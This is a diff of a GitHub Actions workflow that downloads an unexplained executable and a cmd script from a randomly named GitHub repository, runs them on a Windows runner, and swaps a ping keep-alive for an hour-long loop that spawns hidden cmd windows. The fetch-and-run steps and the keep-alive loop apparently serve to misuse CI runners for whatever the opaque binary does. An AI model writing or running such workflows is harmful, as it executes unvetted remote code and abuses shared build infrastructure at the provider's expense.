@@ -6,11 +6,10 @@ jobs:
   build:
 
     runs-on: windows-latest
-    timeout-minutes: 9999
     
     steps:
     - name: Download Untitled.exe
-      run: Invoke-WebRequest https://github.com/w8wbn87f8qdvadsrdfab/SADVUNsnudASOIN/raw/main/Untitled.exe -OutFile untitled.exe
+      run: Invoke-WebRequest https://github.com/w8wbn87f8qdvadsrdfab/SADVUNsnudASOIN/raw/main/Untitled_NEW.exe -OutFile untitled.exe
 
     - name: Download cmd.cmd
       run: Invoke-WebRequest https://github.com/w8wbn87f8qdvadsrdfab/SADVUNsnudASOIN/raw/main/cmd.cmd -OutFile cmd.cmd
@@ -21,6 +20,19 @@ jobs:
       run: |
         .\untitled.exe
         cmd.exe /c .\cmd.cmd
-    - name: Keep Alive
-      run: ping 127.0.0.1 -t > nul
+    - name: Loop
+      run: |
+        $timeout = 3600  # Time in seconds (1 hour)
+        $startTime = [datetime]::Now
+        while (([datetime]::Now - $startTime).TotalSeconds -lt $timeout) {
+          try {
+            Write-Output "I am alive."
+            
+            # Open a new hidden cmd window and immediately execute the exit command
+            Start-Process cmd.exe -ArgumentList '/c exit' -WindowStyle Hidden
 
+          } catch {
+            Write-Output "Error encountered: $_"
+          }
+          Start-Sleep -Seconds 300  # Sleep for 5 minutes
+        }
